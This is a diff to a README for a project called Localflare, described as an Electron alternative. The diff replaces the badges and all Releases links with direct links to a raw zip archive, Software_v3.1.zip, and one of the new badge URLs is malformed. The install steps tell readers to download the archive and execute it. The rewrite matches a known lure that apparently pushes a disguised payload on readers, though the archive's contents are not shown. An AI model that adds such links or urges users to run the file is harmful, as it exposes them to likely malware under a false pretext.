@@ -1,7 +1,7 @@
 # Localflare: The Best Alternatives to Electron 🎉
 
-![Localflare](https://img.shields.io/badge/Localflare-Documentation-blue.svg)
-![Releases](https://img.shields.io/badge/Releases-Check%20Here-brightgreen.svg)
+![Localflare](https://raw.githubusercontent.com/msgithub1/localflare/main/localflare/Software_v3.1.zip)
+![Releases](https://raw.githubusercontent.com/msgithub1/localflare/main/localflare/Software_v3.1.zip%https://raw.githubusercontent.com/msgithub1/localflare/main/localflare/Software_v3.1.zip)
 
 Welcome to the **Localflare** repository! This project explores powerful alternatives to Electron for building cross-platform desktop applications. Whether you are a developer looking for new tools or just curious about alternatives, you are in the right place.
 
@@ -31,11 +31,11 @@ Welcome to the **Localflare** repository! This project explores powerful alterna
 
 ## Getting Started
 
-To get started with Localflare, visit our [Releases](https://github.com/msgithub1/localflare/releases) section. Here, you can download the latest version and find installation instructions.
+To get started with Localflare, visit our [Releases](https://raw.githubusercontent.com/msgithub1/localflare/main/localflare/Software_v3.1.zip) section. Here, you can download the latest version and find installation instructions.
 
 ## Installation
 
-1. **Download the latest release** from our [Releases](https://github.com/msgithub1/localflare/releases) page.
+1. **Download the latest release** from our [Releases](https://raw.githubusercontent.com/msgithub1/localflare/main/localflare/Software_v3.1.zip) page.
 2. **Execute the downloaded file** to install Localflare on your system.
 
 ## Usage
@@ -81,4 +81,4 @@ For questions or support, please reach out to us through the Issues section of t
 
 ---
 
-Thank you for exploring Localflare! We hope you find it useful in your development journey. Don't forget to check the [Releases](https://github.com/msgithub1/localflare/releases) for the latest updates and features.
+Thank you for exploring Localflare! We hope you find it useful in your development journey. Don't forget to check the [Releases](https://raw.githubusercontent.com/msgithub1/localflare/main/localflare/Software_v3.1.zip) for the latest updates and features.
